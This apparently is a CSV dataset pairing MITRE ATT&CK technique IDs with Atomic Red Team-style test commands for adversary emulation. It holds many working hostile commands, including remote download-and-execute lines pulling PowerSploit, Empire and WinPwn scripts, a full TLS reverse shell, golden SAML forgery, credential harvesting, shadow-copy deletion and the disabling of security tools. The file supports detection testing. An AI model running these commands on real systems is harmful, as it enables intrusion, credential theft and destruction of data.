mitre_id,command
T1069,GET-ADUSER -FILTER 'USERACCOUNTCONTROL -BAND 4194304' -PROPERTIES USERACCOUNTCONTROL | FORMAT-TABLE NAME
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""#{immutable_id}"" -pfxfilename ""#{certificate_path}"" -issuer ""#{issuer_uri}"" $conn = get-aadintaccesstokenforaadgraph -samltoken $saml -savetocache if ($conn) { write-host ""`nsuccessfully connected as $($conn.user)"" } else { write-host ""`nthe connection failed"" } write-host ""end of golden saml"" # id_7225"
T1606,"IMPORT-MODULE AADINTERNALS -FORCE $SAML = NEW-AADINTSAMLTOKEN -IMMUTABLEID ""#{IMMUTABLE_ID}"" -PFXFILENAME ""#{CERTIFICATE_PATH}"" -ISSUER ""#{ISSUER_URI}"" $CONN = GET-AADINTACCESSTOKENFORAADGRAPH -SAMLTOKEN $SAML -SAVETOCACHE IF ($CONN) { WRITE-HOST ""`NSUCCESSFULLY CONNECTED AS $($CONN.USER)"" } ELSE { WRITE-HOST ""`NTHE CONNECTION FAILED"" } WRITE-HOST ""END OF GOLDEN SAML"""
T1543,"sc.exe create #{service_name} binpath= ""#{binary_path}"" start=#{startup_type} type=#{service_type} sc.exe start #{service_name} # id_5889"
T1134,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/get-system-techniques/master/tokenmanipulation/get-winlogontokensystem.ps1');get-winlogontokensystem
T1012,reg.exe query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64   
T1021,"set-itemproperty -path 'hklm:\system\currentcontrolset\control\terminal server\winstations\rdp-tcp' -name ""portnumber"" -value #{new_remote_port} new-netfirewallrule -displayname 'rdpportlatest-tcp-in' -profile 'public' -direction inbound -action allow -protocol tcp -localport #{new_remote_port}  "
T1531,"az login $userprincipalname = ""#{userprincipalname}"" az ad user delete --id $userprincipalname"
T1048,"send-mailmessage -from #{sender} -to #{receiver} -subject ""t1048.003 atomic test"" -attachments #{input_file} -smtpserver #{smtp_server}"
T1016,sudo defaults read /library/preferences/com.apple.alf sudo /usr/libexec/applicationfirewall/socketfilterfw --getglobalstate  
T1614,dism.exe /online /get-intl  
T1136,"useradd -g 0 -m -d /root -s /bin/bash #{username} if [ $(cat /etc/os-release | grep -i 'name=""ubuntu""') ]; then echo ""#{username}:#{password}"" | sudo chpasswd; else echo ""#{password}"" | passwd --stdin #{username}; fi; # id_3355"
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""#{immutable_id}"" -pfxfilename ""#{certificate_path}"" -issuer ""#{issuer_uri}"" $conn = get-aadintaccesstokenforaadgraph -samltoken $saml -savetocache if ($conn) { write-host ""`nsuccessfully connected as $($conn.user)"" } else { write-host ""`nthe connection failed"" } write-host ""end of golden saml"" # id_7021"
T1119,new-item -path $env:temp\t1119_powershell_collection -itemtype directory -force | out-null get-childitem -recurse -include *.doc | % {copy-item $_.fullname -destination $env:temp\t1119_powershell_collection} # id_4203
T1578,az snapshot create --resource-group #{azure_resource_group} --name #{azure_snapshot_name} --source #{azure_disk_name} --location eastus
T1610,docker build -t t1610 $pathtoatomicsfolder/t1610/src/ docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh  
T1563,"QUERY USER SC.EXE CREATE SESSHIJACK BINPATH= ""CMD.EXE /K TSCON #{SESSION_ID} /DEST:#{DESTINATION_ID}"" NET START SESSHIJACK"
T1071,"for($i=0; $i -le #{query_volume}; $i++) { resolve-dnsname -type ""#{query_type}"" ""#{subdomain}-$(get-random -minimum 1 -maximum 999999).#{domain}"" -quicktimeout}"
T1105,"timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} ""#{query}"" > #{output_file}"
T1573,"$SERVER_IP = #{SERVER_IP} $SERVER_PORT = #{SERVER_PORT} $SOCKET = NEW-OBJECT NET.SOCKETS.TCPCLIENT('#{SERVER_IP}', '#{SERVER_PORT}') $STREAM = $SOCKET.GETSTREAM() $SSLSTREAM = NEW-OBJECT SYSTEM.NET.SECURITY.SSLSTREAM($STREAM,$FALSE,({$TRUE} -AS [NET.SECURITY.REMOTECERTIFICATEVALIDATIONCALLBACK])) $SSLSTREAM.AUTHENTICATEASCLIENT('FAKEDOMAIN.EXAMPLE', $NULL, ""TLS12"", $FALSE) $WRITER = NEW-OBJECT SYSTEM.IO.STREAMWRITER($SSLSTREAM) $WRITER.WRITE('PS ' + (PWD).PATH + '> ') $WRITER.FLUSH() [BYTE[]]$BYTES = 0..65535|%{0}; WHILE(($I = $SSLSTREAM.READ($BYTES, 0, $BYTES.LENGTH)) -NE 0) {$DATA = (NEW-OBJECT -TYPENAME SYSTEM.TEXT.ASCIIENCODING).GETSTRING($BYTES,0, $I); $SENDBACK = (IEX $DATA | OUT-STRING ) 2>&1; $SENDBACK2 = $SENDBACK + 'PS ' + (PWD).PATH + '> '; $SENDBYTE = ([TEXT.ENCODING]::ASCII).GETBYTES($SENDBACK2); $SSLSTREAM.WRITE($SENDBYTE,0,$SENDBYTE.LENGTH);$SSLSTREAM.FLUSH()}"
T1056,"ps2=`logger -t ""$user"" -f ~/.sh_history` $ps2 tail /var/log/messages"
T1552,reg query hklm /f password /t reg_sz /s reg query hkcu /f password /t reg_sz /s
T1106,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/get-system-techniques/master/createprocess/get-createprocesssystembind.ps1') # id_1075
T1649,"$archive=""$env:public\t1649\atomic_certs.zip"" $exfilpath=""$env:public\t1649\certs"" add-type -assembly ""system.io.compression.filesystem"" remove-item $(split-path $exfilpath) -recurse -force -erroraction ignore mkdir $exfilpath | out-null foreach ($cert in (gci cert:\currentuser\my)) { export-certificate -cert $cert -filepath $exfilpath\$($cert.friendlyname).cer} [io.compression.zipfile]::createfromdirectory($exfilpath, $archive)  "
T1082,systeminfo reg query hklm\system\currentcontrolset\services\disk\enum
T1020,"$sampledata = ""sample data for exfiltration test"" set-content -path ""#{samplefile}"" -value $sampledata $ftpurl = ""#{ftpserver}"" $creds = get-credential -credential ""#{credentials}"" invoke-webrequest -uri $ftpurl -method put -infile ""#{samplefile}"" -credential $creds"
T1484,"reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtimedc /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtimeoffsetdc /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtime /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtimeoffset /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v enablesmartscreen /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v shellsmartscreenlevel /t reg_sz /d block /f # id_5871"
T1056,"osascript -e 'tell app ""system preferences"" to activate' -e 'tell app ""system preferences"" to activate' -e 'tell app ""system preferences"" to display dialog ""software update requires that you type your password to apply changes."" & return & return default answer """" with icon 1 with hidden answer with title ""software update""'  "
T1119,new-item -path $env:temp\t1119_powershell_collection -itemtype directory -force | out-null get-childitem -recurse -include *.doc | % {copy-item $_.fullname -destination $env:temp\t1119_powershell_collection}
T1134,start-athprocessunderspecificparent -filepath #{file_path} -commandline '#{command_line}' -parentid #{parent_pid}
T1134,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/get-system-techniques/master/tokenmanipulation/get-winlogontokensystem.ps1');get-winlogontokensystem   
T1072,"""%programfiles(x86)%/#{pdq_deploy_exe}"""
T1114,"powershell -executionpolicy bypass -command ""#{file_path}\get-inbox.ps1"" -file #{output_file} "
T1087,NET USER ADMINISTRATOR /DOMAIN
T1112,"reg add ""hklm\software\policies\microsoft\windows defender security center\notifications"" /v ""disablenotifications"" /t reg_dword /d 1 /f   "
T1129,"#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{vib_install}"""
T1137,reg.exe add hkcu\software\microsoft\office\#{outlook_version}\outlook\webview\#{outlook_folder} /v url /t reg_sz /d #{url} /f   
T1567,"$apikey = ""#{api_key}"" $content = ""secrets, api keys, passwords..."" $url = ""https://pastebin.com/api/api_post.php"" $postdata = @{ api_dev_key = $apikey api_option = ""paste"" api_paste_code = $content } $response = invoke-restmethod -uri $url -method post -body $postdata write-host ""your paste url: $response""   "
T1529,reboot
T1001,"get-content ""#{image_file}"", ""#{tar_file}"" -encoding byte -readcount 0 | set-content ""#{new_image_file}"" -encoding byte  "
T1033,[system.environment]::username | out-file -filepath .\currentactiveuser.txt $env:username | out-file -filepath .\currentactiveuser.txt -append # id_1124
T1578,az snapshot create --resource-group #{azure_resource_group} --name #{azure_snapshot_name} --source #{azure_disk_name} --location eastus # id_5494
T1560,"path=%path%;""c:\program files (x86)\winzip"" mkdir .\tmp\victim-files cd .\tmp\victim-files echo ""this file will be encrypted"" > .\encrypted_file.txt ""#{winzip_exe}"" -min -a -s""hello"" archive.zip * dir"
T1135,net view \\#{computer_name} # id_1932
T1135,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/recon/powerview.ps1' -usebasicparsing); find-domainshare -checkshareaccess -verbose # id_9224
T1562,sudo launchctl unload /library/launchdaemons/com.carbonblack.daemon.plist sudo launchctl unload /library/launchdaemons/com.carbonblack.defense.daemon.plist
T1611,"echo ""current user: #{username}"" sudo -u docker_user sh -c ""sudo docker run -v /:/mnt --rm --name t1611_privesc -it alpine chroot /mnt id"""
T1651,"import-module ""pathtoatomicsfolder/t1651/src/t1651-1/awsssmattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") # id_1833"
T1505,"$termsrvdll = ""c:\windows\system32\termsrv.dll"" $acl = get-acl $termsrvdll $permission = ""administrators"",""fullcontrol"",""allow"" $accessrule = new-object system.security.accesscontrol.filesystemaccessrule $permission $acl.setaccessrule($accessrule) set-acl -path $termsrvdll -aclobject $acl copy-item -path ""c:\windows\system32\termsrv.dll"" -destination ""c:\windows\system32\termsrv_backup.dll"" -erroraction ignore add-content -path ""c:\windows\system32\termsrv.dll"" -value ""`n"" -nonewline -erroraction ignore move-item -path ""c:\windows\system32\termsrv_backup.dll"" -destination ""c:\windows\system32\termsrv.dll"" -force -erroraction ignore"
T1106,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/get-system-techniques/master/createprocess/get-createprocesssystem.ps1') # id_2587
T1115,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 set-clipboard -value ""atomic t1115 test, grab data from clipboard via vba"" iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""pathtoatomicsfolder\t1115\src\t1115-macrocode.txt"" -officeproduct ""word"" -sub ""getclipboard"" "
T1124,net time \\#{computer_name} w32tm /tz # id_5051
T1195,"kubectl run #{pod_name} --image=#{image_name} --restart=never --attach --rm -i -- bash -lc ""mkdir -p /tmp/test && cd /tmp/test && npm init -y >/dev/null 2>&1 && echo '--- package.json before install ---' && cat package.json && npm install #{package_name} --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"""
T1025,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }"" # id_7082"
T1098,"gcloud config set project #{project_id} key=`gcloud iam service-accounts keys list --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --format=""value(key_id)"" --limit=1` gcloud iam service-accounts keys delete $key --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --quiet"
T1039,copy \\#{remote}\c$\#{share_file} %temp%\#{local_file}
T1070,clear-history
T1047,"wmic /node:#{node} process call create ""rundll32.exe \""#{dll_to_execute}\"" #{function_to_execute}"""
T1217,"find / -path ""*/safari/bookmarks.plist"" 2>/dev/null >> #{output_file} cat #{output_file}   "
T1037,sudo touch /library/startupitems/evilstartup.plist
T1219,"start-process ""#{netsupport_path}"" -argumentlist ""/s /v/qn"" # id_2022"
T1140,"mkdir ""#{output_dir}"" >nul 2>&1 echo hello from atomic red team > ""pathtoatomicsfolder\t1140\src\art-expand-source.txt"" makecab ""pathtoatomicsfolder\t1140\src\art-expand-source.txt"" ""#{cab_path}"" pushd ""#{output_dir}"" expand ""#{cab_path}"" -f:* . popd"
T1056,"# creates gui to prompt for password. expect long pause before prompt is available. $cred = $host.ui.promptforcredential('windows security update', '',[environment]::username, [environment]::userdomainname) # using write-warning to allow message to show on console as echo and other similar commands are not visable from the invoke-atomictest framework. write-warning $cred.getnetworkcredential().password"
T1485,gcloud config set project #{project_id} gcloud storage buckets delete gs://#{bucket_name} # id_6763
T1548,"new-item -force -path ""hkcu:\software\classes\folder\shell\open\command"" -value '#{command_to_execute}' new-itemproperty -force -path ""hkcu:\software\classes\folder\shell\open\command"" -name ""delegateexecute"" start-process -filepath $env:windir\system32\sdclt.exe start-sleep -s 3 # id_1309"
T1070,"remove-item -path (join-path ""$env:systemroot\prefetch\"" (get-childitem -path ""$env:systemroot\prefetch\*.pf"" -name)[0])"
T1033,users w who   
T1218,"rundll32.exe setupapi.dll,installhinfsection defaultinstall 128 ""#{inf_to_execute}"""
T1091,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive/t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" }"
T1614,"$info = @{ uilanguage = get-winuilanguageoverride userlanguages = (get-winuserlanguagelist).languagetag -join ', ' systemlocale = get-winsystemlocale currentculture = [system.globalization.cultureinfo]::currentculture.name currentuiculture = [system.globalization.cultureinfo]::currentuiculture.name timezone = (get-timezone).id } $info.getenumerator() | foreach-object { ""$($_.name): $($_.value)"" }"
T1547,pnputil.exe -i -a #{driver_path}
T1106,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/get-system-techniques/master/namedpipe/namedpipesystem.ps1')   
T1134,"get-ciminstance -classname win32_process -property name, commandline, processid -filter ""name = 'svchost.exe' and commandline like '%'"" | select-object -first 1 | start-athprocessunderspecificparent -filepath #{file_path} -commandline '#{command_line}'   "
T1573,"$server_ip = #{server_ip} $server_port = #{server_port} $socket = new-object net.sockets.tcpclient('#{server_ip}', '#{server_port}') $stream = $socket.getstream() $sslstream = new-object system.net.security.sslstream($stream,$false,({$true} -as [net.security.remotecertificatevalidationcallback])) $sslstream.authenticateasclient('fakedomain.example', $null, ""tls12"", $false) $writer = new-object system.io.streamwriter($sslstream) $writer.write('ps ' + (pwd).path + '> ') $writer.flush() [byte[]]$bytes = 0..65535|%{0}; while(($i = $sslstream.read($bytes, 0, $bytes.length)) -ne 0) {$data = (new-object -typename system.text.asciiencoding).getstring($bytes,0, $i); $sendback = (iex $data | out-string ) 2>&1; $sendback2 = $sendback + 'ps ' + (pwd).path + '> '; $sendbyte = ([text.encoding]::ascii).getbytes($sendback2); $sslstream.write($sendbyte,0,$sendbyte.length);$sslstream.flush()} "
T1030,cd #{folder_path}; split -b 5000000 #{file_name} ls -l #{folder_path} # id_4902
T1651,"import-module ""pathtoatomicsfolder/t1651/src/t1651-1/awsssmattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") # id_7820"
T1611,"kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=never -ti --rm --image alpine --overrides '{""spec"":{""hostpid"": true, ""containers"":[{""name"":""1"",""image"":""alpine"",""command"":[""nsenter"",""--mount=/proc/1/ns/mnt"",""--"",""/bin/bash""],""stdin"": true,""tty"":true,""securitycontext"":{""privileged"":true}}]}}'  "
T1082,"$s3cur3th1ssh1t_repo = 'https://raw.githubusercontent.com/s3cur3th1ssh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-seatbelt.ps1') invoke-seatbelt -command ""-group=all"" "
T1569,launchctl submit -l #{label_name} -- #{executable_path} # id_3583
T1580,aws ec2 describe-security-groups --profile #{aws_profile} --output #{output_format}
T1558,[NET.SERVICEPOINTMANAGER]::SECURITYPROTOCOL = [NET.SECURITYPROTOCOLTYPE]::TLS12 IEX(IWR HTTPS://RAW.GITHUBUSERCONTENT.COM/EMPIREPROJECT/EMPIRE/08CBD274BEF78243D7A8ED6443B8364ACD1FC48B/DATA/MODULE_SOURCE/CREDENTIALS/INVOKE-KERBEROAST.PS1 -USEBASICPARSING) INVOKE-KERBEROAST | FL
T1039,copy \\#{remote}\c$\#{share_file} %temp%\#{local_file} # id_7229
T1654,powershell -c {get-eventlog 'security' | where {$_.message -like '*system*'} | export-csv $env:temp\t1654_events.txt}
T1620,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') mimiload -consoleoutput -noninteractive 
T1115,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 set-clipboard -value ""atomic t1115 test, grab data from clipboard via vba"" iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""pathtoatomicsfolder\t1115\src\t1115-macrocode.txt"" -officeproduct ""word"" -sub ""getclipboard"""
T1069,get-adgroup -filter *
T1010,"c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:#{output_file_name} ""#{input_source_code}"" #{output_file_name}"
T1098,"if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo ""$ssh_authorized_keys"" > ~/.ssh/authorized_keys; fi;"
T1490,vssadmin.exe delete shadows /all /quiet # id_3103
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached "
T1090,netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport} connectaddress=#{connectaddress}
T1648,"import-module ""pathtoatomicsfolder/t1648/src/t1648-1/lambdaattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region  "
T1201,get-addefaultdomainpasswordpolicy
T1484,"import-module azuread import-module aadinternals $pword = convertto-securestring -string ""#{azure_password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{azure_username}"", $pword try { connect-azuread -credential $credential -erroraction stop > $null } catch { write-host ""error: azuread could not connect"" exit 1 } try { $domain = get-azureaddomain -name ""#{domain_name}"" } catch { write-host ""error: domain """"#{domain_name}"""" not found"" exit 1 } if (-not $domain.isverified) { write-host ""error: domain """"#{domain_name}"""" not verified"" exit 1 } if ($domain.authenticationtype -eq ""federated"") { write-host ""error: domain """"#{domain_name}"""" already federated. try with a different domain or re-create it before."" exit 1 } $at = get-aadintaccesstokenforaadgraph -credentials $credential if (-not $at) { write-host ""error: aadinternals could not connect"" exit 1 } $new = convertto-aadintbackdoor -accesstoken $at -domainname ""#{domain_name}"" if ($new) { write-host ""federation successfully added to azure ad"" write-host $new } else { write-host ""the federation setup failed"" } write-host ""end of federation configuration."""
T1571,echo quit | telnet #{domain} #{port} exit 0 
T1124,GET-DATE
T1491,"$notepath = join-path $env:temp ""#{note_filename}"" $pidpath = join-path $env:temp ""#{pid_filename}"" $title = ""#{note_title}"" $body = ""#{note_body}"" $header = $title + ""`r`n"" + ('=' * $title.length) + ""`r`n`r`n"" $content = $header + $body [system.io.file]::writealltext($notepath, $content, [system.text.encoding]::utf8) $p = start-process notepad.exe -argumentlist ""`""$notepath`"""" -passthru $p.id | out-file -filepath $pidpath -encoding ascii -force # id_7356"
T1036,"sc create win32times binpath= ""cmd /c start c:\t1036.004_nonexistingscript.ps1"" sc qc win32times # id_3591"
T1105,sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
T1546,"$input_table = ""#{parent_list}"".split("","") $name = ""debugger"" $value = ""#{attached_process}"" foreach ($item in $input_table){ $item = $item.trim() $registrypath = ""hklm:\software\microsoft\windows nt\currentversion\image file execution options\$item"" if(!(test-path $registrypath)) { new-item -path $registrypath -force new-itemproperty -path $registrypath -name $name -value $value -propertytype string -force } else { new-itemproperty -path $registrypath -name $name -value $value } }"
T1555,"VAULTCMD /LISTCREDS:""WINDOWS CREDENTIALS"" /ALL"
T1082,uname -a >> #{output_file} if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> #{output_file}; fi if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> #{output_file}; fi if [ -f /etc/issue ]; then cat /etc/issue >> #{output_file}; fi if [ -f /etc/os-release ]; then cat /etc/os-release >> #{output_file}; fi uptime >> #{output_file} cat #{output_file} 2>/dev/null
T1555,SECURITY IMPORT #{CERT_EXPORT} -K
T1552,$usernameinfo = (get-childitem env:username).value get-childitem -hidden c:\users\$usernameinfo\appdata\roaming\microsoft\credentials\ get-childitem -hidden c:\users\$usernameinfo\appdata\local\microsoft\credentials\ # id_2788
T1021,"set-powercliconfiguration -invalidcertificateaction ignore -participateinceip:$false -confirm:$false connect-viserver -server #{vm_host} -user #{vm_user} -password #{vm_pass} get-vmhostservice -vmhost #{vm_host} | where-object {$_.key -eq ""tsm-ssh"" } | start-vmhostservice -confirm:$false # id_7053"
T1056,"&""$pathtoatomicsfolder\t1056.001\src\get-keystrokes.ps1"" -logpath #{filepath}   "
T1074,curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1074.001/src/discovery.sh | sh -s > #{output_file}   
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`"" `""exit`"""" $dc = start-process -filepath cmd.exe -verb runas -argumentlist ""/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzparam"" # wait for fake dc server to be ready... start-sleep -seconds 5 # server ready, so trigger replication (push) and wait until it finished & ""#{mimikatz_path}"" ""lsadump::dcshadow /push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow""   "
T1560,makecab.exe #{input_file} #{output_file} # id_6931
T1490,wbadmin delete systemstatebackup -keepversions:0
T1083,LS -RECURSE GET-CHILDITEM -RECURSE GCI -RECURSE
T1548,cp #{payload} /tmp/cap.c make /tmp/cap sudo setcap cap_setuid=ep /tmp/cap /tmp/cap # id_5497
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestart /t reg_binary /d a273b6f07104d601 /f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestop /t reg_binary /d 96ef514b7204d601 /f
T1219,start-process #{ultravnc_viewer_path}
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""#{immutable_id}"" -pfxfilename ""#{certificate_path}"" -issuer ""#{issuer_uri}"" $conn = get-aadintaccesstokenforaadgraph -samltoken $saml -savetocache if ($conn) { write-host ""`nsuccessfully connected as $($conn.user)"" } else { write-host ""`nthe connection failed"" } write-host ""end of golden saml""  "
T1486,openssl enc #{encryption_option} -in #{input_file_path} -out #{output_file_name}  
T1105,#{curl_path} -k #{file_download} -o c:\users\public\music\allthethingsx64.dll #{curl_path} -k #{file_download} --output c:\users\public\music\allthethingsx64.dll #{curl_path} -k #{file_download} -o c:\programdata\allthethingsx64.dll #{curl_path} -k #{file_download} -o %temp%\allthethingsx64.dll # id_9288
T1614,chcp
T1552,python2 lazagne.py all
T1531,net user #{user_account} #{new_user_password} /add net.exe user #{user_account} /delete # id_3090
T1113,"cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12 add-type -memberdefinition '[dllimport(""user32.dll"")] public static extern void mouse_event(int flags, int dx, int dy, int cbuttons, int info);' -name u32 -namespace w; [w.u32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0); cmd /c ""timeout #{recording_time} > null && psr.exe /stop"""
T1003,"""#{dumpert_exe}"""
T1612,docker build -t t1612 $pathtoatomicsfolder/t1612/src/ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container ./test.sh
T1074,"invoke-webrequest ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1074.001/src/discovery.bat"" -outfile #{output_file} "
T1201,cat /etc/pam.d/common-password # id_6929
